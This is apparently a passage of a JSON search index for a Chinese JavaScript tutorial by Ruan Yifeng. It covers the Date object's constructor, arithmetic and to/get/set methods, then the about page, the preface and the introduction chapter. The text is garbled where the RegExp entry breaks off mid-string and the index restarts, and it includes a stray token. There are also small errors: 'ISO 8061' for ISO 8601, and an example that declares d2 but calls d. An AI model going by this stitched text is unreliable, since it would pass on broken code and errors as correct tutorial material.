0, 0)\n// Mon Dec 31 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码的第二个例子，日期设为<code>0</code>，就代表上个月的最后一天。</p>\n<p>参数还可以使用负数，表示扣去的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, -1)\n// Sat Dec 01 2012 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, -1)\n// Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，分别对月和日使用了负数，表示从基准日扣去相应的时间。</p>\n\n        <h2>\n            <a href='#日期的运算' class='header-anchor'>#</a>\n            <span>日期的运算</span>\n        </h2>\n    <p>类型自动转换时，<code>Date</code>实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(2000, 2, 1);\nvar d2 = new Date(2000, 3, 1);\n\nd2 - d1\n// 2678400000\nd2 + d1\n// &quot;Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)&quot;</code></pre>\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Date.now()' class='header-anchor'>#</a>\n            <span>Date.now()</span>\n        </h3>\n    <p><code>Date.now</code>方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.now() // 1364026285194</code></pre>\n        <h3>\n            <a href='#Date.parse()' class='header-anchor'>#</a>\n            <span>Date.parse()</span>\n        </h3>\n    <p><code>Date.parse</code>方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。</p>\n<p>日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>格式，其中最后的<code>Z</code>表示时区。但是，其他格式也可以被解析，请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;Aug 9, 1995&#039;)\nDate.parse(&#039;January 26, 2011 13:51:50&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 GMT&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 +0430&#039;)\nDate.parse(&#039;2011-10-10&#039;)\nDate.parse(&#039;2011-10-10T14:48:00&#039;)</code></pre><p>上面的日期字符串都可以解析。</p>\n<p>如果解析失败，返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;xxx&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#Date.UTC()' class='header-anchor'>#</a>\n            <span>Date.UTC()</span>\n        </h3>\n    <p><code>Date.UTC</code>方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 格式\nDate.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])\n\n// 用法\nDate.UTC(2011, 0, 1, 2, 3, 4, 567)\n// 1293847384567</code></pre><p>该方法的参数用法与<code>Date</code>构造函数完全一致，比如月从<code>0</code>开始计算，日期从<code>1</code>开始计算。区别在于<code>Date.UTC</code>方法的参数，会被解释为 UTC 时间（世界标准时间），<code>Date</code>构造函数的参数会被解释为当前时区的时间。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Date</code>的实例对象，有几十个自己的方法，除了<code>valueOf</code>和<code>toString</code>，可以分为以下三类。</p>\n<ul>\n<li><code>to</code>类：从<code>Date</code>对象返回一个字符串，表示指定的时间。</li>\n<li><code>get</code>类：获取<code>Date</code>对象的日期和时间。</li>\n<li><code>set</code>类：设置<code>Date</code>对象的日期和时间。</li>\n</ul>\n\n        <h3>\n            <a href='#Date.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Date.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于<code>getTime</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\nd.valueOf() // 1362790014817\nd.getTime() // 1362790014817</code></pre><p>预期为数值的场合，<code>Date</code>实例会自动调用该方法，所以可以用下面的方法计算时间的间隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var start = new Date();\n// ...\nvar end = new Date();\nvar elapsed = end - start;</code></pre>\n        <h3>\n            <a href='#to-类方法' class='header-anchor'>#</a>\n            <span>to 类方法</span>\n        </h3>\n    <p><strong>（1）Date.prototype.toString()</strong></p>\n<p><code>toString</code>方法返回一个完整的日期字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toString()\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;\nd\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;</code></pre><p>因为<code>toString</code>是默认的调用方法，所以如果直接读取<code>Date</code>实例，就相当于调用这个方法。</p>\n<p><strong>（2）Date.prototype.toUTCString()</strong></p>\n<p><code>toUTCString</code>方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toUTCString()\n// &quot;Mon, 31 Dec 2012 16:00:00 GMT&quot;</code></pre><p><strong>（3）Date.prototype.toISOString()</strong></p>\n<p><code>toISOString</code>方法返回对应时间的 ISO8601 写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toISOString()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p>注意，<code>toISOString</code>方法返回的总是 UTC 时区的时间。</p>\n<p><strong>（4）Date.prototype.toJSON()</strong></p>\n<p><code>toJSON</code>方法返回一个符合 JSON 格式的 ISO 日期字符串，与<code>toISOString</code>方法的返回结果完全相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toJSON()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p><strong>（5）Date.prototype.toDateString()</strong></p>\n<p><code>toDateString</code>方法返回日期字符串（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toDateString() // &quot;Tue Jan 01 2013&quot;</code></pre><p><strong>（6）Date.prototype.toTimeString()</strong></p>\n<p><code>toTimeString</code>方法返回时间字符串（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toTimeString() // &quot;00:00:00 GMT+0800 (CST)&quot;</code></pre><p><strong>（7）Date.prototype.toLocaleDateString()</strong></p>\n<p><code>toLocaleDateString</code>方法返回一个字符串，代表日期的当地写法（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleDateString()\n// 中文版浏览器为&quot;2013年1月1日&quot;\n// 英文版浏览器为&quot;1/1/2013&quot;</code></pre><p><strong>（8）Date.prototype.toLocaleTimeString()</strong></p>\n<p><code>toLocaleTimeString</code>方法返回一个字符串，代表时间的当地写法（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleTimeString()\n// 中文版浏览器为&quot;上午12:00:00&quot;\n// 英文版浏览器为&quot;12:00:00 AM&quot;</code></pre>\n        <h3>\n            <a href='#get-类方法' class='header-anchor'>#</a>\n            <span>get 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>get*</code>方法，用来获取实例对象某个方面的值。</p>\n<ul>\n<li><code>getTime()</code>：返回实例距离1970年1月1日00:00:00的毫秒数，等同于<code>valueOf</code>方法。</li>\n<li><code>getDate()</code>：返回实例对象对应每个月的几号（从1开始）。</li>\n<li><code>getDay()</code>：返回星期几，星期日为0，星期一为1，以此类推。</li>\n<li><code>getYear()</code>：返回距离1900的年数。</li>\n<li><code>getFullYear()</code>：返回四位的年份。</li>\n<li><code>getMonth()</code>：返回月份（0表示1月，11表示12月）。</li>\n<li><code>getHours()</code>：返回小时（0-23）。</li>\n<li><code>getMilliseconds()</code>：返回毫秒（0-999）。</li>\n<li><code>getMinutes()</code>：返回分钟（0-59）。</li>\n<li><code>getSeconds()</code>：返回秒（0-59）。</li>\n<li><code>getTimezoneOffset()</code>：返回当前时间与 UTC 的时区差异，以分钟表示，返回结果考虑到了夏令时因素。</li>\n</ul>\n<p>所有这些<code>get*</code>方法返回的都是整数，不同方法返回值的范围不一样。</p>\n<ul>\n<li>分钟和秒：0 到 59</li>\n<li>小时：0 到 23</li>\n<li>星期：0（星期天）到 6（星期六）</li>\n<li>日期：1 到 31</li>\n<li>月份：0（一月）到 11（十二月）</li>\n<li>年份：距离1900年的年数</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getMonth() // 0\nd.getYear() // 113\nd.getFullYear() // 2013\nd.getTimezoneOffset() // -480</code></pre><p>上面代码中，最后一行返回<code>-480</code>，即 UTC 时间减去当前时间，单位是分钟。<code>-480</code>表示 UTC 比当前时间少480分钟，即当前时区比 UTC 早8个小时。</p>\n<p>下面是一个例子，计算本年度还剩下多少天。</p>\n<pre class=\"prettyprint language-javascript\"><code>function leftDays() {\n  var today = new Date();\n  var endYear = new Date(today.getFullYear(), 11, 31, 23, 59, 59, 999);\n  var msPerDay = 24 * 60 * 60 * 1000;\n  return Math.round((endYear.getTime() - today.getTime()) / msPerDay);\n}</code></pre><p>上面这些<code>get*</code>方法返回的都是当前时区的时间，<code>Date</code>对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间。</p>\n<ul>\n<li><code>getUTCDate()</code></li>\n<li><code>getUTCFullYear()</code></li>\n<li><code>getUTCMonth()</code></li>\n<li><code>getUTCDay()</code></li>\n<li><code>getUTCHours()</code></li>\n<li><code>getUTCMinutes()</code></li>\n<li><code>getUTCSeconds()</code></li>\n<li><code>getUTCMilliseconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getUTCDate() // 5</code></pre><p>上面代码中，实例对象<code>d</code>表示当前时区（东八时区）的1月6日0点0分0秒，这个时间对于当前时区来说是1月6日，所以<code>getDate</code>方法返回6，对于 UTC 时区来说是1月5日，所以<code>getUTCDate</code>方法返回5。</p>\n\n        <h3>\n            <a href='#set-类方法' class='header-anchor'>#</a>\n            <span>set 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>set*</code>方法，用来设置实例对象的各个方面。</p>\n<ul>\n<li><code>setDate(date)</code>：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。</li>\n<li><code>setYear(year)</code>: 设置距离1900年的年数。</li>\n<li><code>setFullYear(year [, month, date])</code>：设置四位年份。</li>\n<li><code>setHours(hour [, min, sec, ms])</code>：设置小时（0-23）。</li>\n<li><code>setMilliseconds()</code>：设置毫秒（0-999）。</li>\n<li><code>setMinutes(min [, sec, ms])</code>：设置分钟（0-59）。</li>\n<li><code>setMonth(month [, date])</code>：设置月份（0-11）。</li>\n<li><code>setSeconds(sec [, ms])</code>：设置秒（0-59）。</li>\n<li><code>setTime(milliseconds)</code>：设置毫秒时间戳。</li>\n</ul>\n<p>这些方法基本是跟<code>get*</code>方法一一对应的，但是没有<code>setDay</code>方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即<code>0</code>是1月，<code>11</code>是12月。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date (&#039;January 6, 2013&#039;);\n\nd // Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\nd.setDate(9) // 1357660800000\nd // Wed Jan 09 2013 00:00:00 GMT+0800 (CST)</code></pre><p><code>set*</code>方法的参数都会自动折算。以<code>setDate</code>为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(&#039;January 6, 2013&#039;);\n\nd1.setDate(32) // 1359648000000\nd1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST)\n\nvar d2 = new Date (&#039;January 6, 2013&#039;);\n\nd.setDate(-1) // 1356796800000\nd // Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p><code>set</code>类方法和<code>get</code>类方法，可以结合使用，得到相对时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\n// 将日期向后推1000天\nd.setDate(d.getDate() + 1000);\n// 将时间设为6小时后\nd.setHours(d.getHours() + 6);\n// 将年份设为去年\nd.setFullYear(d.getFullYear() - 1);</code></pre><p><code>set*</code>系列方法除了<code>setTime()</code>和<code>setYear()</code>，都有对应的 UTC 版本，即设置 UTC 时区的时间。</p>\n<ul>\n<li><code>setUTCDate()</code></li>\n<li><code>setUTCFullYear()</code></li>\n<li><code>setUTCHours()</code></li>\n<li><code>setUTCMilliseconds()</code></li>\n<li><code>setUTCMinutes()</code></li>\n<li><code>setUTCMonth()</code></li>\n<li><code>setUTCSeconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\nd.getUTCHours() // 16\nd.setUTCHours(22) // 1357423200000\nd // Sun Jan 06 2013 06:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，本地时区（东八时区）的1月6日0点0分，是 UTC 时区的前一天下午16点。设为 UTC 时区的22点以后，就变为本地时区的上午6点。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Rakhitha Nimesh，<a href=\"http://jspro.com/raw-javascript/beginners-guide-to-javascript-date-and-time/\">Getting Started with the Date Object</a></li>\n<li>Ilya Kantor, <a href=\"http://javascript.info/tutorial/datetime-functions\">Date/Time functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"RegExp 对象","link":"/stdlib/regexp.html"}],"content":：匹配结果前面的文本。</li>\n<li>__448__#39;：匹配结果后面的文本。</li>\n<li>$n：匹配成功的第<code>n</code>组内容，<code>n</code>是从1开始的自然数。</li>\n<li>$：指代美元符号<code>$</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.replace(/(\\w+)\\s(\\w+)/, &#039;$2 $1&#039;)\n// &quot;world hello&quot;\n\n&#039;abc&#039;.replace(&#039;b&#039;, &#039;[(function(){var content=[{"context":[{"title":"关于","link":"/index.html"}],"content":"\n        <h1>\n            <a href='#关于此教程' class='header-anchor'>#</a>\n            <span>关于此教程</span>\n        </h1>\n    <p>你现在看到的是阮一峰老师的JavaScript教程。</p>\n<p>本教程的作者是阮一峰老师，采用<a href=\"https://creativecommons.org/licenses/by-sa/3.0/deed.zh\">知识共享 署名-相同方式共享 3.0协议</a>。</p>\n<p>本文档只是将其制作成了 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的版本。</p>\n\n        <h1>\n            <a href='#本文档构建说明' class='header-anchor'>#</a>\n            <span>本文档构建说明</span>\n        </h1>\n    <p>请访问 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的github地址以查找更多帮助。</p>\n"},{"context":[{"title":"阮一峰前言","link":"/preface.html"}],"content":"\n        <h1>\n            <a href='#前言' class='header-anchor'>#</a>\n            <span>前言</span>\n        </h1>\n    <p>我写这本教程，主要原因是自己需要。</p>\n<p>编程时，往往需要查阅资料，确定准确用法。理想的 JavaScript 参考书，应该简明易懂，一目了然，告诉我有哪些注意点，提供代码范例。如果涉及重要概念，还应该适当讲解。可是大多数时候，现实都不是如此。找到的资料冗长难懂，抓不住重点，有时还很陈旧，跟不上语言标准和浏览器的快速发展，且大多数是英文资料。</p>\n<p>学习过程中，我做了很多 JavaScript 笔记。多年累积，数量相当庞大。遇到问题，我首先查自己的笔记，如果笔记里没有，再到网上查，最后回过头把笔记补全。终于有一天，我意识到可以把笔记做成书，这就是这本书的由来。</p>\n<p>正因为脱胎于笔记，这本教程跟其他 JavaScript 书籍有所不同。作为教程，本书对所有重要概念都进行了讲解，努力把复杂的问题讲得简单，希望一两分钟内就能抓住重点。本书还可以作为参考手册，罗列了主要用法和各种 API 接口，并给出可以立即运行的代码。所有章节按照语言的 API 编排，方便以后的查阅。</p>\n<p>如果你发现某处出现陌生的新概念，请不要担心，可以继续阅读下去。以后查阅这些章节的时候，你会发现很方便找到某个知识点相关的所有内容。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"导论","link":"/basic/introduction.html"}],"content":"\n        <h1>\n            <a href='#导论' class='header-anchor'>#</a>\n            <span>导论</span>\n        </h1>\n    \n        <h2>\n            <a href='#什么是-JavaScript-语言？' class='header-anchor'>#</a>\n            <span>什么是 JavaScript 语言？</span>\n        </h2>\n    <p>JavaScript 是一种轻量级的脚本语言。所谓“脚本语言”（script language），指的是它不具备开发操作系统的能力，而是只用来编写控制其他大型应用程序（比如浏览器）的“脚本”。</p>\n<p>JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。</p>\n<p>目前，已经嵌入 JavaScript 的宿主环境有多种，最常见的环境就是浏览器，另外还有服务器环境，也就是 Node 项目。</p>\n<p>从语法角度看，JavaScript 语言是一种“对象模型”语言。各种宿主环境通过这个模型，描述自己的功能和操作接口，从而通过 JavaScript 控制这些功能。但是，JavaScript 并不是纯粹的“面向对象语言”，还支持其他编程范式（比如函数式编程）。这导致几乎任何一个问题，JavaScript 都有多种解决方法。阅读本书的过程中，你会诧异于 JavaScript 语法的灵活性。</p>\n<p>JavaScript 的核心语法部分相当精简，只包括两个部分：基本的语法构造（比如操作符、控制结构、语句）和标准库（就是一系列具有各种功能的对象比如<code>Array</code>、<code>Date</code>、<code>Math</code>等）。除此之外，各种宿主环境提供额外的 API（即只能在该环境使用的接口），以便 JavaScript 调用。以浏览器为例，它提供的额外 API 可以分成三大类。</p>\n<ul>\n<li>浏览器控制类：操作浏览器</li>\n<li>DOM 类：操作网页的各种元素</li>\n<li>Web 类：实现互联网的各种功能</li>\n</ul>\n<p>如果宿主环境是服务器，则会提供各种操作系统的 API，比如文件操作 API、网络通信 API等等。这些你都可以在 Node 环境中找到。</p>\n<p>本书主要介绍 JavaScript 核心语法和浏览器网页开发的基本知识，不涉及 Node。全书可以分成以下四大部分。</p>\n<ul>\n<li>基本语法</li>\n<li>标准库</li>\n<li>浏览器 API</li>\n<li>DOM</li>\n</ul>\n<p>JavaScript 语言有多个版本。本书的内容主要基于 ECMAScript 5.1 版本，这是学习 JavaScript 语法的基础。ES6 和更新的语法请参考我写的<a href=\"http://es6.ruanyifeng.com/\">《ECMAScript 6入门》</a>。</p>\n\n        <h2>\n            <a href='#为什么学习-JavaScript？' class='header-anchor'>#</a>\n            <span>为什么学习 JavaScript？</span>\n        </h2>\n    <p>JavaScript 语言有一些显著特点，使得它非常值得学习。它既适合作为学习编程的入门语言，也适合当作日常开发的工作语言。它是目前最有希望、前途最光明的计算机语言之一。</p>\n\n        <h3>\n            <a href='#操控浏览器的能力' class='header-anchor'>#</a>\n            <span>操控浏览器的能力</span>\n        </h3>\n    <p>JavaScript 的发明目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力。它是目前唯一一种通用的浏览器脚本语言，所有浏览器都支持。它可以让网页呈现各种特殊效果，为用户提供良好的互动体验。</p>\n<p>目前，全世界几乎所有网页都使用 JavaScript。如果不用，网站的易用性和使用效率将大打折扣，无法成为操作便利、对用户友好的网站。</p>\n<p>对于一个互联网开发者来说，如果你想提供漂亮的网页、令用户满意的上网体验、各种基于浏览器的便捷功能、前后端之间紧密高效的联系，JavaScript 是必不可少的工具。</p>\n\n        <h3>\n            <a href='#广泛的使用领域' class='header-anchor'>#</a>\n            <span>广泛的使用领域</span>\n        </h3>\n    <p>近年来，JavaScript 的使用范围，慢慢超越了浏览器，正在向通用的系统语言发展。</p>\n<p><strong>（1）浏览器的平台化</strong></p>\n<p>随着 HTML5 的出现，浏览器本身的功能越来越强，不再仅仅能浏览网页，而是越来越像一个平台，JavaScript 因此得以调用许多系统功能，比如操作本地文件、操作图片、调用摄像头和麦克风等等。这使得 JavaScript 可以完成许多以前无法想象的事情。</p>\n<p><strong>（2）Node</strong></p>\n<p>Node 项目使得 JavaScript 可以用于开发服务器端的大型项目，网站的前后端都用 JavaScript 开发已经成为了现实。有些嵌入式平台（Raspberry Pi）能够安装 Node，于是 JavaScript 就能为这些平台开发应用程序。</p>\n<p><strong>（3）数据库操作</strong></p>\n<p>JavaScript 甚至也可以用来操作数据库。NoSQL 数据库这个概念，本身就是在 JSON（JavaScript Object Notation）格式的基础上诞生的，大部分 NoSQL 数据库允许 JavaScript 直接操作。基于 SQL 语言的开源数据库 PostgreSQL 支持 JavaScript 作为操作语言，可以部分取代 SQL 查询语言。</p>\n<p><strong>（4）移动平台开发</strong></p>\n<p>JavaScript 也正在成为手机应用的开发语言。一般来说，安卓平台使用 Java 语言开发，iOS 平台使用 Objective-C 或 Swift 语言开发。许多人正在努力，让 JavaScript 成为各个平台的通用开发语言。</p>\n<p>PhoneGap 项目就是将 JavaScript 和 HTML5 打包在一个容器之中，使得它能同时在 iOS 和安卓上运行。Facebook 公司的 React Native 项目则是将 JavaScript 写的组件，编译成原生组件，从而使它们具备优秀的性能。</p>\n<p>Mozilla 基金会的手机操作系统 Firefox OS，更是直接将 JavaScript 作为操作系统的平台语言，但是很可惜这个项目没有成功。</p>\n<p><strong>（5）内嵌脚本语言</strong></p>\n<p>越来越多的应用程序，将 JavaScript 作为内嵌的脚本语言，比如 Adobe 公司的著名 PDF 阅读器 Acrobat、Linux 桌面环境 GNOME 3。</p>\n<p><strong>（6）跨平台的桌面应用程序</strong></p>\n<p>Chromium OS、Windows 8 等操作系统直接支持 JavaScript 编写应用程序。Mozilla 的 Open Web Apps 项目、Google 的 <a href=\"http://developer.chrome.com/apps/about_apps\">Chrome App 项目</a>、Github 的 <a href=\"http://electron.atom.io/\">Electron 项目</a>、以及 <a href=\"http://tidesdk.multipart.net/docs/user-dev/generated/\">TideSDK 项目</a>，都可以用来编写运行于 Windows、Mac OS 和 Android 等多个桌面平台的程序，不依赖浏览器。</p>\n<p><strong>（7）小结</strong></p>\n<p>可以预期，JavaScript 最终将能让你只用一种语言，就开发出适应不同平台（包括桌面端、服务器端、手机端）的程序。早在2013年9月的<a href=\"http://adambard.com/blog/top-github-languages-for-2013-so-far/\">统计</a>之中，JavaScript 就是当年 Github 上使用量排名第一的语言。</p>\n<p>著名程序员 Jeff Atwood 甚至提出了一条 <a href=\"http://www.codinghorror.com/blog/2007/07/the-principle-of-least-power.html\">“Atwood 定律”</a>：</p>\n<blockquote>\n<p>“所有可以用 JavaScript 编写的程序，最终都会出现 JavaScript 的版本。”(Any application that can be written in JavaScript will eventually be written in JavaScript.)</p>\n</blockquote>\n\n        <h3>\n            <a href='#易学性' class='header-anchor'>#</a>\n            <span>易学性</span>\n        </h3>\n    <p>相比学习其他语言，学习 JavaScript 有一些有利条件。</p>\n<p><strong>（1）学习环境无处不在</strong></p>\n<p>只要有浏览器，就能运行 JavaScript 程序；只要有文本编辑器，就能编写 JavaScript 程序。这意味着，几乎所有电脑都原生提供 JavaScript 学习环境，不用另行安装复杂的 IDE（集成开发环境）和编译器。</p>\n<p><strong>（2）简单性</strong></p>\n<p>相比其他脚本语言（比如 Python 或 Ruby），JavaScript 的语法相对简单一些，本身的语法特性并不是特别多。而且，那些语法中的复杂部分，也不是必需要学会。你完全可以只用简单命令，完成大部分的操作。</p>\n<p><strong>（3）与主流语言的相似性</strong></p>\n<p>JavaScript 的语法很类似 C/C++ 和 Java，如果学过这些语言（事实上大多数学校都教），JavaScript 的入门会非常容易。</p>\n<p>必须说明的是，虽然核心语法不难，但是 JavaScript 的复杂性体现在另外两个方面。</p>\n<p>首先，它涉及大量的外部 API。JavaScript 要发挥作用，必须与其他组件配合，这些外部组件五花八门，数量极其庞大，几乎涉及网络应用的各个方面，掌握它们绝非易事。</p>\n<p>其次，JavaScript 语言有一些设计缺陷。某些地方相当不合理，另一些地方则会出现怪异的运行结果。学习 JavaScript，很大一部分时间是用来搞清楚哪些地方有陷阱。Douglas Crockford 写过一本有名的书，名字就叫<a href=\"http://javascript.crockford.com/\">《JavaScript: The Good Parts》</a>，言下之意就是这门语言不好的地方很多，必须写一本书才能讲清楚。另外一些程序员则感到，为了更合理地编写 JavaScript 程序，就不能用 JavaScript 来写，而必须发明新的语言，比如 CoffeeScript、TypeScript、Dart 这些新语言的发明目的，多多少少都有这个因素。</p>\n<p>尽管如此，目前看来，JavaScript 的地位还是无法动摇。加之，语言标准的快速进化，使得 JavaScript 功能日益增强，而语法缺陷和怪异之处得到了弥补。所以，JavaScript 还是值得学习，况且它的入门真的不难。</p>\n\n        <h3>\n            <a href='#强大的性能' class='header-anchor'>#</a>\n            <span>强大的性能</span>\n        </h3>\n    <p>JavaScript 的性能优势体现在以下方面。</p>\n<p><strong>（1）灵活的语法，表达力强。</strong></p>\n<p>JavaScript 既支持类似 C 语言清晰的过程式编程，也支持灵活的函数式编程，可以用来写并发处理（concurrent）。这些语法特性已经被证明非常强大，可以用于许多场合，尤其适用异步编程。</p>\n<p>JavaScript 的所有值都是对象，这为程序员提供了灵活性和便利性。因为你可以很方便地、按照需要随时创造数据结构，不用进行麻烦的预定义。</p>\n<p>JavaScript 的标准还在快速进化中，并不断合理化，添加更适用的语法特性。</p>\n<p><strong>（2）支持编译运行。</strong></p>\n<p>JavaScript 语言本身，虽然是一种解释型语言，但是在现代浏览器中，JavaScript 都是编译后运行。程序会被高度优化，运行效率接近二进制程序。而且，JavaScript 引擎正在快速发展，性能将越来越好。</p>\n<p>此外，还有一种 WebAssembly 格式，它是 JavaScript 引擎的中间码格式，全部都是二进制代码。由于跳过了编译步骤，可以达到接近原生二进制代码的运行速度。各种语言（主要是 C 和 C++）通过编译成 WebAssembly，就可以在浏览器里面运行。</p>\n<p><strong>（3）事件驱动和非阻塞式设计。</strong></p>\n<p>JavaScript 程序可以采用事件驱动（event-driven）和非阻塞式（non-blocking）设计，在服务器端适合高并发环境，普通的硬件就可以承受很大的访问量。</p>\n\n        <h3>\n            <a href='#开放性' class='header-anchor'>#</a>\n            <span>开放性</span>\n        </h3>\n    <p>JavaScript 是一种开放的语言。它的标准 ECMA-262 是 ISO 国际标准，写得非常详尽明确；该标准的主要实现（比如 V8 和 SpiderMonkey 引擎）都是开放的，而且质量很高。这保证了这门语言不属于任何公司或个人，不存在版权和专利的问题。</p>\n<p>语言标准由 TC39 委员会负责制定，该委员会的运作是透明的，所有讨论都是开放的，会议记录都会对外公布。</p>\n<p>不同公司的 JavaScript 运行环境，兼容性很好，程序不做调整或只做很小的调整，就能在所有浏览器上运行。</p>\n\n        <h3>\n            <a href='#社区支持和就业机会' class='header-anchor'>#</a>\n            <span>社区支持和就业机会</span>\n        </h3>\n    <p>全世界程序员都在使用 JavaScript，它有着极大的社区、广泛的文献和图书、丰富的代码资源。绝大部分你需要用到的功能，都有多个开源函数库可供选用。</p>\n<p>作为项目负责人，你不难招聘到数量众多的 JavaScript 程序员；作为开发者，你也不难找到一份 JavaScript 的工作。</p>\n\n        <h2>\n            <a href='#实验环境' class='header-anchor'>#</a>\n            <span>实验环境</span>\n        </h2>\n    <p>本教程包含大量的示例代码，只要电脑安装了浏览器，就可以用来实验了。读者可以一边读一边运行示例，加深理解。</p>\n<p>推荐安装 Chrome 浏览器，它的“开发者工具”（Developer Tools）里面的“控制台”（console），就是运行 JavaScript 代码的理想环境。</p>\n<p>进入 Chrome 浏览器的“控制台”，有两种方法。</p>\n<ul>\n<li>直接进入：按下<code>Option + Command + J</code>（Mac）或者<code>Ctrl + Shift + J</code>（Windows / Linux）</li>\n<li>开发者工具进入：开发者工具的快捷键是 F12，或者<code>Option + Command + I</code>（Mac）以及<code>Ctrl + Shift + I</code>（Windows / Linux），然后选择 Console 面板</li>\n</ul>\n<p>进入控制台以后，就可以在提示符后输入代码，然后按<code>Enter</code>键，代码就会执行。如果按<code>Shift + Enter</code>键，就是代码换行，不会触发执行。建议阅读本教程时，将代码复制到控制台进行实验。</p>\n<p>作为尝试，你可以将下面的程序复制到“控制台”，按下回车后，就可以看到运行结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greetMe(yourName) {\n  console.log(&#039;Hello &#039; + yourName);\n}\n\ngreetMe(&#039;World&#039;)\n// Hello World</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"历史","link":"/basic/history.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-语言的历史' class='header-anchor'>#</a>\n            <span>JavaScript 语言的历史</span>\n        </h1>\n    \n        <h2>\n            <a href='#诞生' class='header-anchor'>#</a>\n            <span>诞生</span>\n        </h2>\n    <p>JavaScript 